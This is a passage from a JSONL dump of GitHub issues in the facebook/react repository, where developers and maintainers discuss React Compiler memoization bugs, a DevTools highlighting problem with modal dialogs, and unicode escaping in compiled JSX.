you see performance improvements. When the compiler bails out due to a rule of React violation, it leaves it untouched.\r\n\r\nWhile `useIsFirstRender` or `usePrevious` will not be compiled, it would not prevent a component elsewhere that uses that hook from being compiled. \r\n"}, {"author": "eduter", "body": "> We are also using this usePrevious hook implementation frequently. The purpose of its returned value is not to be accessed during render but within a `useEffect` hook for a more fine-grained control of how to react to which changes.\n\n@mpressmar I was trying to solve the same problem and came up with this hook. It only accesses `ref.current` within effects, but still allows your effects to access the previous values of all its dependencies.\n\n```ts\n/**\n * Similar to useEffect, but also provides the previous values of the\n * dependencies so that you have more control over when you run your\n * side effects.\n *\n * NOTE: To make sure you don't forget to add dependencies to your\n *   useEffectWithPrevious, add the following to your eslint config:\n *     \"react-hooks/exhaustive-deps\": [\n *       \"warn\",\n *       { \"additionalHooks\": \"useEffectWithPrevious\" }\n *     ],\n */\nfunction useEffectWithPrevious<T extends DependencyList>(\n    effect: (prevDeps: T | []) => void | Destructor,\n    deps: [...T]\n) {\n    const prevDepsRef = useRef<T>();\n    const stableEffect = useRef(effect);\n\n    useEffect(() => {\n        stableEffect.current = effect;\n    }, [effect]);\n\n    useEffect(() => {\n        const prevDeps = prevDepsRef.current;\n\n        if (!prevDeps || deps.some((dep, i) => !Object.is(dep, prevDeps[i]))) {\n            stableEffect.current(prevDeps ?? []);\n            prevDepsRef.current = deps;\n        }\n    });\n}\n\ntype Destructor = () => void;\n```\n\nSample usage:\n```ts\nuseEffectWithPrevious(\n    ([previousList]) => {\n        if (previousList && previousList.length < list.length) {\n            onListIncrease(list);\n        }\n    },\n    [list, onListIncrease]\n);\n\nuseEffectWithPrevious(\n    ([previousA, previousB]) => {\n        if (a !== previousA) {\n            onUpdateA(a, b);\n        }\n        if (b !== previousB) {\n            onUpdateB(a, b);\n        }\n    },\n    [a, b, onUpdateA, onUpdateB]\n);\n```"}]}
{"repo": "facebook/react", "issue_number": 34195, "issue_url": "https://github.com/facebook/react/issues/34195", "issue_title": "[DevTools Bug]: No highlighting on modal `<dialog>` elements", "issue_author": "Rumperuu", "issue_body": "### Website or app\n\nhttps://github.com/Rumperuu/react-dev-tools-dialog-example\n\n### Repro steps\n\n1. Open a [`<dialog>` element](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/dialog) using the [`showModal()` method](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/showModal)\n2. Try to highlight components within the modal dialog using React DevTools\n\nVerified present in React 17 & 19, Waterfox 6.5.11 (based on Firefox ESR 128) and Chrome 139 and React DevTools 6.1.1 (Firefox) and 6.1.5 (Chrome).\n\nOpening a non-modal dialog (with [`show()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/show)) works as expected.\n\nhttps://github.com/user-attachments/assets/acca8815-c122-4b28-b6ea-abc73b34e9a0\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\n_No response_\n\n### DevTools version (automated)\n\n_No response_\n\n### Error message (automated)\n\n_No response_\n\n### Error call stack (automated)\n\n```text\n\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\n\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "fotisoikonomou", "body": "The problem is only  repoccurs only  with `dialog.showModal()` because modal <dialog> is promoted to the browser\u2019s top layer. The React DevTools overlay is appended to the document and can\u2019t cover/top elements in the top layer, so highlighting fails.\n\nExtra tips:\n\u2022 In development, open the dialog with show() instead of `showModal()` and simulate the modal lock with\n `body:has(dialog[open]) { overflow: hidden; }.`\n\u2022 Alternatively, use a portal-based dialog (Radix/Reach/Headless UI), which stays inside the DOM tree rather than the top layer\u2014highlighting works.\n\u2022 When you must keep `showModal()`, rely on the browser\u2019s inspector for element highlighting.\nThis seems like a DevTools overlay limitation with top-layer elements rather than a React core issue."}]}
{"repo": "facebook/react", "issue_number": 34311, "issue_url": "https://github.com/facebook/react/issues/34311", "issue_title": "[Compiler Bug]: errors when the `this` type is declared in a function", "issue_author": "sadan4", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [x] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAHQHYIB4AcIwAuABAGZQZyECWEGxUYCAYhBABQCGxAvMcAF8AlMmKcMAT36ZixOHTAlsvBkwDKhToQRdiAfj3FCMKAiEBuTDOIB6G8WoBzDAQRgjE3G7gxquEmASGJrY1oSeCMRqEAC2CAAqESriEpb0tvYIMDAE7nRGABbU7ricMJxx2jAeXg705JQ0dNYNVLT1bOyERWCi0XGJXkLSGNYC1jAIhLD0oRgCIAJAA\n\n### Repro steps\n\n1. Have any hook or component written in Typescript that has a function with the `this` type declared.\n2. Notice react compiler error.\n\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\nLatest version on playground\n\n### What version of React Compiler are you using?\n\nLatest version on playground", "issue_labels": ["Type: Bug", "Status: Unconfirmed"], "comments": [{"author": "josephsavona", "body": "Thanks for posting. We don\u2019t support using `this` but the error message could be more clear. Cc @poteto "}, {"author": "poteto", "body": "I recently found out that TypeScript supports _typing_ the [`this`](https://www.typescriptlang.org/docs/handbook/2/functions.html#declaring-this-in-a-function) parameter. \n\nThe checking I previously added didn't account for this, so there's a small false positive when `this` is typed in the parameters, but not actually used in the function, like in the OP's playground example. But the developer should probably not type something that is unused, so I think our existing validation is sufficient even if there's a small chance for a false positive.\n\nI can make this error message clearer on why `this` is not supported."}, {"author": "sadan4", "body": "> The checking I previously added didn't account for this, so there's a small false positive when `this` is typed in the parameters, but not actually used in the function, like in the OP's playground example. But the developer should probably not type something that is unused, so I think our existing validation is sufficient even if there's a small chance for a false positive.\n\nI should note that the invalid identifier error message is also the one shown even if `this` is used in the function. (I never saw the error message on the general usage of `this` not being handled yet)\n\n"}]}
{"repo": "facebook/react", "issue_number": 33978, "issue_url": "https://github.com/facebook/react/issues/33978", "issue_title": "[Compiler Bug]: Component defined inside function cause incorrect optimization", "issue_author": "suguanYang", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhASwLYAcIwC4AEASggIZyEBmMEGBA5DGRfQNwA6AdlwgB474ClKJwpoInAgHMEeAJKcsUPAApSASgLAuBAnAlhCAdRiksWBDAIBeAis3WAfFp269BwgAtSnACYAbBABhb04ZGzsHZ21JN11SADoJEJ8Zew5Y3QBfDK5XXSY8WEkVfLcAHjRFZTK45NCZa2BQgOCGhCzagkcu8oB6KqU8HsyCdQzs3NjC4oITMwsYLk7OECygA\n\n### Repro steps\n\nSource code:\n```\nimport React from 'react';\n\nexport function getInput(a) {\n  const Wrapper = () => {\n    const handleChange = () => {\n      a.onChange();\n    };\n\n\n    return (\n      <input\n        onChange={handleChange}\n      >\n      </input>\n    );\n  };\n\n  return Wrapper\n}\n\n```\n\nAfter React Compiler, the `handleChange` function was hoisted with function level variables(here is the argument `a`, but it can be any variables defined inside `getInput`)\n```\nimport { c as _c } from \"react/compiler-runtime\";\nimport React from \"react\";\n\nexport function getInput(a) {\n  const Wrapper = () => {\n    const $ = _c(1);\n    const handleChange = _temp;\n    let t0;\n    if ($[0] === Symbol.for(\"react.memo_cache_sentinel\")) {\n      t0 = <input onChange={handleChange} />;\n      $[0] = t0;\n    } else {\n      t0 = $[0];\n    }\n    return t0;\n  };\n\n  return Wrapper;\n}\nfunction _temp() {\n  a.onChange(); // a is not defined in this scope\n}\n\n```\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\nReact 18\n\n### What version of React Compiler are you using?\n\n19.1.0-rc.2", "issue_labels": ["Type: Bug", "Component: React Compiler"], "comments": [{"author": "josephsavona", "body": "Yup, that's a bug. Thank you for reporting, we'll fix."}]}
{"repo": "facebook/react", "issue_number": 34308, "issue_url": "https://github.com/facebook/react/issues/34308", "issue_title": "[Compiler Bug]:", "issue_author": "mribichich", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nReact compiler memoizing impure imported functions\n\n### Repro steps\n\nReact compiler is memoizing an `imported impure function` that depend on a `global reference` and on a `local state variable`, which I think is the key here.\n\nThe function looks something like this:\n\n```\n// utils file\n\n// impure function\nexport const getSomeValue = (param) => globalRef.doSomething(param);\n\n\n// component file\nimport { getSomeValue } from './utils';\n\nexport const Comp = () => {\n  const param = useSomeHook();\n\n  // compiler is putting this called under: `if (cache[x] !== param)`\n  const result = getSomeValue(param);\n  ...\n}\n```\n\nmy expectation, since it was an imported function, and the compiler doesn't know if it's pure or not, that it wouldn't memoize it.\n\nit would make sense if the function was pure.\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.1.1\n\n### What version of React Compiler are you using?\n\n19.1.0-rc.2", "issue_labels": ["Type: Bug", "Status: Unconfirmed"], "comments": [{"author": "josephsavona", "body": "Yup, this is expected behavior. React requires that components and hooks are [pure functions of props, state, and context](https://react.dev/reference/rules). React Compiler compiles code assuming that it upholds this fundamental rule of React. If a component is pure and it calls an imported helper w `helper(arg)`, then by definition the only thing that can change the value is if `arg` changes. This is why you see the memoization behavior you described. \n\nIn your example, `Comp` could already fail to update in a number of ways wo involving the compiler. For example, someone could wrap it in React.memo, wrap a `<Comp />` element in useMemo(), or wrap the `getSomeValue(arg)` call in useMemo(), all of which would cause the value to stop updating. To ensure components update as their inputs change in React, you have to use state, pass new root props, or some abstraction over those. \n\nNote that React Compiler makes a best effort to detect use of known impure functions, like Date.now or Math.random. But in general, it\u2019s up to developers to not use impure functions. "}, {"author": "josephsavona", "body": "I realized after writing this: your example uses a helper that you define, imported from another file. Was that actually the situation in your app or was it a third-party library that you were calling? I\u2019m curious because if it was a library meant for use in React then it would be good to pass on feedback to the library. "}, {"author": "mribichich", "body": "> I realized after writing this: your example uses a helper that you define, imported from another file. Was that actually the situation in your app or was it a third-party library that you were calling? I\u2019m curious because if it was a library meant for use in React then it would be good to pass on feedback to the library.\n\nyeah it's exactly how it was done in our app.\n\nit's a helper function in a different file that calculates something based on that `param` and some `global state`.\n\nand yes what you said before I totally agreed, it's not done in the best way. cos someone could use the `memo` util, but in this case there's a hook that subscribes to something that makes the component re-render.\n\nMy thinking by creating this ticket was, that an external function from another file, unless analysed by the compiler, shouldn't be memoize cos it could be impure in some fashion, unless one could signal that's pure or something.\n\nthanks!"}, {"author": "josephsavona", "body": "Thanks for confirming. The compiler assumes that if you\u2019re calling a function in render that it\u2019s pure - it\u2019s simply impractical to have users opt-in to telling us every single function that\u2019s pure or impure other than by using or not using them during render. "}]}
{"repo": "facebook/react", "issue_number": 34280, "issue_url": "https://github.com/facebook/react/issues/34280", "issue_title": "https://github.com/facebook/react/issues/new/choose", "issue_author": "yongyuthdamdang-eng", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [x] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [x] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [x] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nimport { useSession, getSession } from \"next-auth/react\"  export default function Page() {   const { data: session, status } = useSession()    if (status === \"loading\") {     return <p>Loading...</p>   }    if (status === \"unauthenticated\") {     return <p>Access Denied</p>   }    return (     <>       <h1>Protected Page</h\n\n### Repro steps\n\ngoogel-yongyuthdamdang@gmail.com\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n { useSession, getSession } from \"next-auth/react\"  export default function Page() {   const { data: session, status } = useSession()    if (status === \"loading\") {     return <p>Loading...</p>   }    if (status === \"unauthenticated\") {     return <p>Access Denied</p>   }    return (     <>       <h1>Protected Page</h\n\n### What version of React Compiler are you using?\n\nhttps://github.com/facebook/react/issues/new/choose", "issue_labels": ["Type: Bug", "Status: Unconfirmed"], "comments": []}
{"repo": "facebook/react", "issue_number": 34281, "issue_url": "https://github.com/facebook/react/issues/34281", "issue_title": "[Compiler Bug]:", "issue_author": "yongyuthdamdang-eng", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [x] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [x] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [x] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nimport { useSession, getSession } from \"next-auth/react\"  export default function Page() {   const { data: session, status } = useSession()    if (status === \"loading\") {     return <p>Loading...</p>   }    if (status === \"unauthenticated\") {     return <p>Access Denied</p>   }    return (     <>       <h1>Protected Page</h\n\n### Repro steps\n\ngoogel-yongyuthdamdang@gmail.com\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n { useSession, getSession } from \"next-auth/react\"  export default function Page() {   const { data: session, status } = useSession()    if (status === \"loading\") {     return <p>Loading...</p>   }    if (status === \"unauthenticated\") {     return <p>Access Denied</p>   }    return (     <>       <h1>Protected Page</h\n\n### What version of React Compiler are you using?\n\nhttps://github.com/facebook/react/issues/new/choose", "issue_labels": ["Type: Bug", "Status: Unconfirmed"], "comments": [{"author": "josephsavona", "body": "Please specify the expected and observed behavior. There nothing here to tell us what you think is wrong."}]}
{"repo": "facebook/react", "issue_number": 34282, "issue_url": "https://github.com/facebook/react/issues/34282", "issue_title": "[Compiler Bug]:", "issue_author": "yongyuthdamdang-eng", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [x] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [x] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [x] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nimport { useSession, getSession } from \"next-auth/react\"  export default function Page() {   const { data: session, status } = useSession()    if (status === \"loading\") {     return <p>Loading...</p>   }    if (status === \"unauthenticated\") {     return <p>Access Denied</p>   }    return (     <>       <h1>Protected Page</h\n\n### Repro steps\n\ngoogel-yongyuthdamdang@gmail.com\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n { useSession, getSession } from \"next-auth/react\"  export default function Page() {   const { data: session, status } = useSession()    if (status === \"loading\") {     return <p>Loading...</p>   }    if (status === \"unauthenticated\") {     return <p>Access Denied</p>   }    return (     <>       <h1>Protected Page</h\n\n### What version of React Compiler are you using?\n\nhttps://github.com/facebook/react/issues/new/choose", "issue_labels": ["Type: Bug", "Status: Unconfirmed"], "comments": [{"author": "josephsavona", "body": "Please specify the expected and observed behavior. There nothing here to tell us what you think is wrong. "}]}
{"repo": "facebook/react", "issue_number": 34211, "issue_url": "https://github.com/facebook/react/issues/34211", "issue_title": "[Compiler Bug]: breaks referencial stability in @tanstack/react-query", "issue_author": "TheSisb", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [x] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://stackblitz.com/edit/vitejs-vite-ucqzqtvo?file=vite.config.ts\n\n### Repro steps\n\nI noticed my fetch responses weren't referentially stable and causing aggressive re-renders in my application. I traced it to react-compiler's interactions on @tanstack/react-query and made a repro attached above.  Not sure how to solve this, seems like a strange react-compiler side effect.\n\n- The useMemo is rerunning when `data` is unchanged\n```\nexport function useFetchThing() {\n  const { data, isLoading, error } = useQuery({\n    queryKey: ['blah'],\n    queryFn: async () => {\n      const resp = await fetch('google.com');\n      return resp;\n    },\n  });\n\n  React.useMemo(() => {\n    console.log(\n      '!!! Should not re-run on re-render, but does with react-compiler!'\n    );\n  }, [data]);\n\n  return { data, isLoading, error };\n}\n```\n\n\n\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.1.0\n\n### What version of React Compiler are you using?\n\n19.1.0-rc.2", "issue_labels": ["Type: Bug", "Status: Unconfirmed"], "comments": [{"author": "josephsavona", "body": "Are you using the latest eslint-plugin-react-hooks RC? If you open this in [compiler playground](https://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAgDMoA7OXASwhPyjAQDEFc4ALAFVYpIHMAKAJT5gAHRr441MAWD4AJgENcCgDT4KYADIQFc7jzUIYMHPgC++ALy16ARShGAnn1Hj8+AI4OYjgNIJHZHwAbQByACMAGwVWUIBdFTF3dy8nBhIghTBHMnxBKwA+YSTk90kSaXwYBDBMK3wFAHcFCgJCZjY+UJ4ICB5IhAA6SQBbUIEAbhLS6txYGmraqbdzRPEzSbESgCUEBXJBugQAWQQRiD58yyLXUvLIAcHIvr5p5NCAQi-8AGVWaEicnwJAgBGqAFoYKR8NQqghIQgSHIjGpwlACHIIDV8I1Wqw4ftcODRpgKAMYB9Qm9Nus1MFFMo4jSSrN5sJ5EpVOotDo9LxDMZTGZlmYQGYgA), the compiler highlights that the useMemo itself is problematic. The compiler knows that `console.log()` is just for debugging and really doesn't do anything (doesn't produce a value), so it doesn't get memoized unless it happens to be part of some other code that it getting memoized. That isn't the case here, it's just a standalone log call, so we don't memoize it. \n\nDo you have some actual computation that isn't getting memoized as you'd expect? The linked repro has the same code that you pasted so i wasn't sure."}, {"author": "TheSisb", "body": "Maybe I went a little too overboard on the _minimal_ repro if react-compiler is smart enough to optimize that away. However the issue persists with a more complicated setup:\n\n```\nimport React from 'react';\nimport { useQuery } from '@tanstack/react-query';\n\nconst computeThing = () => {\n  console.log(\n    '!!! Should not re-run on re-render, but does with react-compiler!'\n  );\n  return Math.sqrt(10 * 9 * 8 * 7 * 6 * 5);\n};\n\nexport function useFetchThing() {\n  const { data, isLoading, error } = useQuery({\n    queryKey: ['blah'],\n    queryFn: async () => {\n      const resp = await fetch('google.com');\n      return resp;\n    },\n  });\n\n  const x = React.useMemo(() => {\n    return computeThing();\n  }, [data]);\n\n  console.log(x);\n\n  return { data, isLoading, error };\n}\n```\n\n<img width=\"2910\" height=\"425\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/bef67887-36bb-45ec-94f7-41d03a7fc9d6\" />\n\nAnd indeed, in my application the operation I'm running in the memo was slow enough to produce significant lag, which is how I found this. It's a very common pattern for us to want to merge/mutate the HTTP response in some significant way.\n\nIn my application: \n\n<img width=\"901\" height=\"1255\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/912f0ae4-968d-4450-86b7-025a1e181508\" />\n\n<img width=\"242\" height=\"123\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/d097e11e-3794-456e-9923-a13d56f902c4\" />"}, {"author": "josephsavona", "body": "Gotcha, thanks for confirming. So we can maybe simplify to where there's a `computeThing(data)` call and the result of that is returned: [example playground](https://playground.react.dev/#N4Igzg9grgTgxgUxALhASwLYAcIwC4AEASggIZyEBmMEGBA5DGRfQNwA6AdpjvgcAShgEARSgIYATwIBfAtVoMAAnlKcwquAGsA9E3J4AtAEdxUtly5wI6wtexQ8CACoALNJwDmBALwEAFACUvgB8-FwEBNbqEAA2CAB0sRCe-hGRDACE2QQAyq7QsQAmBJwQhEyGMFCcBDYElUycRRIANAQARo4ERRAIYAQA7mh4rg3MRvZYaPEwmfTpgRy143iwtQCypKMJYMb4-gCMAAwEAFQEAJznBAAcNwDsNwBsNwCsS1wyy1wIAB68Kg1ChoepCBAAMQQeDgrjcHlSwWA6WiGn4PW2pHaaDAABkIKQigj2hIaDBZL5BMIxBJJP5kStIqZaQBpBCSZAEADa9A6sVIrnoAF1WukmWZJBDOJzSGBJJw4AFgj4wgyMhlURV+lhKaRBqQRvJobD-PRPBAUvEEvZ6J9GRkmGsYLUmGAsMt1TJRSsZHaUTY0VNHAgSn4SAYEuCNggMBB-EFQuF7Y71lFaFhg-CvP4ipi7ZEvdzc6ohX6Vqi4olkqk-mXIinneig04iti8QSiV4STAybJljIQDIgA).\n\nAs you can see, the compiler is memoizing the `computeThing(data)` call, and will only run it when  `data` changes. Relevant bit from the output panel is:\n\n```js\n  let t1;\n  if ($[1] !== data) {\n    t1 = computeThing(data);\n    $[1] = data;\n    $[2] = t1;\n  } else {\n    t1 = $[2];\n  }\n  const computed = t1;\n```\n\nThis is the same behavior as `useMemo()`. If this is re-running, then by process of elimination it means that `data` must have actually changed (or the component itself got torn down and re-rendered, perhaps it rendered with a different `key`?). If `useFetch()` isn't returning stable results, that would be a bug with its implementation."}, {"author": "TkDodo", "body": "The problem in the reproduction is that the memoization wasn\u2019t using `data`, and that the custom hook wasn\u2019t doing anything with the `useMemo` result apart from logging it.\n\nHere\u2019s a version where:\n\n- `computeThing` actually uses data\n- `useFetchThing` returns the result that `useMemo` computes\n- the component actually renders the result from `useFetchThing`\n\nand with that, everything works as expected:\n\nhttps://stackblitz.com/edit/vitejs-vite-hvnbdwnm?file=src%2FuseFetchThing.tsx\n"}, {"author": "TheSisb", "body": "Thank you for the explanation, this makes sense."}]}
{"repo": "facebook/react", "issue_number": 32915, "issue_url": "https://github.com/facebook/react/issues/32915", "issue_title": "[Compiler Bug]: Unicode characters handled incorrectly", "issue_author": "JCown", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAgBMEAzAQygBsCSoA7OXASwjvwFkBPAQU0wAoAlPmAAdNvhgJcsNv3H5F+ADxcAwhAC22OgjoFcGXAF5RIAO4JKcLQnyBeDcDSO2fwB6AHwL8ggNziAvuJBulg4BDZ0YATqWjp6BMb4-JgwEJhgwsbuIl5SMjBsyoRMAG7uwClpYAB0hui4-g6Oyq7FZQEg-kA\n\n### Repro steps\n\nWhen passing a unicode character as a prop, like `<MyComponent text=\"welcome \ud83d\udc4b\" />` then in RC output code we can see `<MyComponent text=\"welcome \\uD83D\\uDC4B\" />` - unicode character gets replaced by \"stringified\" UTF-16 representation of it.\n\n**Expected result (on the screen)**\nWelcome \ud83d\udc4b\n\n**Actual result:**\nWelcome \\uD83D\\uDC4B\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.1\n\n### What version of React Compiler are you using?\n\n19.0.0-beta-ebf51a3-20250411", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": [{"author": "josephsavona", "body": "Thanks for reporting! I double-checked and React Compiler is not transforming the string contents: the Babel AST node that we construct has the original unescaped string. However, we have previously seen that _Babel_ will escape strings with unicode if those string appear as direct JSX attribute values. This can thankfully be avoided by using an expression container instead:\n\n```js\n<Text text=\"may get escaped by Babel if this has unicode> />\n<Text text={\"won't get escaped by Babel\"} />\n```\n\nWe check for unicode and if present emit the latter form. However, it looks like our unicode check only handles codepoints on the basic plane of unicode, and not \"astral\" planes (i did not make these terms up, i swear). I'll look at how we can detect astral plane codepoints / surrogate pairs."}, {"author": "josephsavona", "body": "Fixed in #32915"}, {"author": "jurosh", "body": "> Fixed in [#32915](https://github.com/facebook/react/issues/32915)\n\nWrong link ? Looks like you meant thisone https://github.com/facebook/react/pull/33096"}]}
{"repo": "facebook/react", "issue_number": 32947, "issue_url": "https://github.com/facebook/react/issues/32947", "issue_title": "[Compiler Bug]: Property 'tsSatisfiesExpression' does not exist on type...", "issue_author": "saul-atomrigs", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [x] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://github.com/facebook/react/blob/4a36d3eab7d9bbbfae62699989aa95e5a0297c16/compiler/packages/babel-plugin-react-compiler/src/ReactiveScopes/CodegenReactiveFunction.ts#L2119\n\n### Repro steps\n\n<img width=\"617\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/cb86c6ca-3fb4-469a-a33d-4c427feca386\" />\n\n`tsSatisfiesExpression` type error in:\nhttps://github.com/facebook/react/blob/4a36d3eab7d9bbbfae62699989aa95e5a0297c16/compiler/packages/babel-plugin-react-compiler/src/ReactiveScopes/CodegenReactiveFunction.ts#L2119\n\nrelated PR: \n- https://github.com/facebook/react/pull/32742\n- https://github.com/facebook/react/pull/29818\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.1.0 (latest)\n\n### What version of React Compiler are you using?\n\nlatest", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": [{"author": "josephsavona", "body": "What version of Babel are you using?"}, {"author": "josephsavona", "body": "This appears to be a Babel version issue, even older versions of Babel have this method."}]}
{"repo": "facebook/react", "issue_number": 31727, "issue_url": "https://github.com/facebook/react/issues/31727", "issue_title": "[Compiler Bug]: Compiler fails to memoize hooks with no hook calls", "issue_author": "billyjanitsch", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [X] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://github.com/billyjanitsch/react-compiler-hook-detection-bug\n\n### Repro steps\n\nGiven the following three custom hooks:\r\n\r\n```tsx\r\nimport {useDebugValue} from 'react'\r\n\r\nfunction useFoo() {\r\n  return () => 'foo'\r\n}\r\n\r\nfunction useBar() {\r\n  useDebugValue('bar')\r\n  return () => 'bar'\r\n}\r\n\r\nfunction useBaz() {\r\n  return useCallback(() => 'baz', [])\r\n}\r\n```\r\n\r\nI'd expect the compiler to memoize all of them, but it only memoizes `useBar` and `useBaz`:\r\n\r\n```tsx\r\nimport { useCallback, useDebugValue } from \"react\";\r\nfunction useFoo() {\r\n  return () => \"foo\";\r\n}\r\nfunction useBar() {\r\n  useDebugValue(\"bar\");\r\n  return _temp;\r\n}\r\nfunction _temp() {\r\n  return \"bar\";\r\n}\r\nfunction useBaz() {\r\n  return _temp2;\r\n}\r\nfunction _temp2() {\r\n  return \"baz\";\r\n}\r\n```\r\n\r\nI'm guessing that it's because the compiler's hook detection logic looks for at least one hook call in the function body. I understand that it generally doesn't make sense to write a custom hook that doesn't use any other hooks, but the exception is when the custom hook would have used only `useMemo` and/or `useCallback`, such as `useBaz`. I expect the compiler to let me remove those hooks without losing memoization.\r\n\r\nThis doesn't reproduce in the playground. I'm not sure why.\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.0.0\n\n### What version of React Compiler are you using?\n\n19.0.0-beta-37ed2a7-20241206", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": [{"author": "Donhv", "body": "i want handle memo & callback by my self "}, {"author": "mofeiZ", "body": "Thanks for reporting @billyjanitsch.\r\n\r\nAs you observed, currently the compiler only optimizes functions that look to contain react code (such as hook calls or JSX)\r\n<img width=\"500\" alt=\"image\" src=\"https://github.com/user-attachments/assets/1e5e35b7-e858-427c-9264-58e71b22fe93\" />\r\n\r\nWe know that this isn't a perfect heuristic --  internally, we use [Flow's component and hook syntax](https://flow.org/en/docs/react/component-syntax/) which unambiguously indicates which functions are eligible for optimization. \r\n\r\nMost React users outside of Meta don't use Flow, so this is an area that we know the compiler needs improvement on. We'd love to hear more details about your use case, could you share a bit about:\r\n- what app logic your hook contains, and why it needs to be a custom hook (instead of a non-hook function)\r\n- why memoization optimizations need to be applied to the hook\r\n"}, {"author": "billyjanitsch", "body": "@mofeiZ Sure! Building off of the general case that I mentioned:\r\n\r\n>I understand that it generally doesn't make sense to write a custom hook that doesn't use any other hooks, but the exception is when the custom hook would have used only useMemo and/or useCallback, such as useBaz. I expect the compiler to let me remove those hooks without losing memoization.\r\n\r\nHere are some simplified concrete examples of hooks that only use `useCallback` and/or `useMemo`:\r\n\r\n```tsx\r\nfunction useMergedRefs(refA, refB) {\r\n  return useCallback((node) => {\r\n    // (simplified implementation only for ref callbacks)\r\n    refA(node)\r\n    refB(node)\r\n  }, [refA, refB])\r\n}\r\n```\r\n\r\n```tsx\r\nfunction useProcessedData(data) {\r\n  return useMemo(() => someExpensiveTransform(data), [data])\r\n}\r\n```\r\n\r\nThe crux of the issue is that I expect the React compiler to let me remove `useCallback` and `useMemo` from these hooks because it can memoize them automatically. But when I do so, the hooks lose memoization because the compiler no longer considers them hooks without those calls.\r\n\r\nDoes that clear up why these need to be hooks rather than non-hook functions, and why memoization optimizations are required?\r\n\r\n(As a workaround, I can leave the manual `useCallback` and `useMemo` calls in place. Is this the intended long-term 